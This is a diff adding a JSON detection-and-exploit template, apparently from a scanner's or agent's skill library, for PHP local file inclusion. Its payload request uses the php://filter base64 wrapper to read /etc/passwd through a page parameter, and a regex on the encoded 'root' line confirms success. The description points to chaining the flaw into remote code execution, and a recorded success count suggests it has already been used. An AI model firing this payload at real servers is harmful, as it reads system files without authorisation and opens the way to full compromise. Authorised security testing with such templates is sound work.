@@ -1,0 +1,35 @@
+{
+  "name": "web/PHP filter wrapper LFI base64 read",
+  "description": "[god] PHP wrapper file-read via php://filter (CWE-98; Synacktiv php_filter_chain_generator + PortSwigger/PAT): convert.base64-encode over /etc/passwd smuggles the file past output-escaping — the base64 passwd prefix is the oracle. Keywords: php filter wrapper lfi base64 encode include file read synacktiv. ctrl: wrappers blocked/allowlisted -> not falsified. base_url = page/include parameter root; copy skill for the Synacktiv iconv chain to turn LFI into RCE.",
+  "cwe": "CWE-98",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd"
+    },
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/index.php?page=home"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "cm9vdDp4OjA6MD"
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 200
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "50761991e9c4",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
